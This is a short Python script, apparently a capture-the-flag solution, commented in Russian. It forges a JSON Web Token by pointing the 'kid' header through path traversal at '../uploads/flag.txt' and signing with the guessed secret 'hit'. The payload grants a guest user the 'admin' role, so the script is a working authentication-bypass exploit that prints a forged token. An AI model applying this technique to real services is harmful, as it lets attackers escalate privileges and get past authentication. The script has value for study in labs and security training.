import base64, hmac, hashlib, json

def create_jwt(kid, secret):
    # Чистый заголовок без лишних полей
    header = {"alg": "HS256", "kid": kid}
    payload = {"sub": "guest", "role": "admin"}
    
    def b64(d):
        return base64.urlsafe_b64encode(json.dumps(d, separators=(',', ':')).encode()).decode().rstrip('=')

    unsigned = f"{b64(header)}.{b64(payload)}"
    # Подписываем строку секретом "hit"
    sig = hmac.new(secret.encode(), unsigned.encode(), hashlib.sha256).digest()
    return f"{unsigned}.{base64.urlsafe_b64encode(sig).decode().rstrip('=')}"

# Мы уже знаем, что сервер видит файлы по пути ../uploads/
print("Твой новый токен:")
print(create_jwt("../uploads/flag.txt", "hit"))
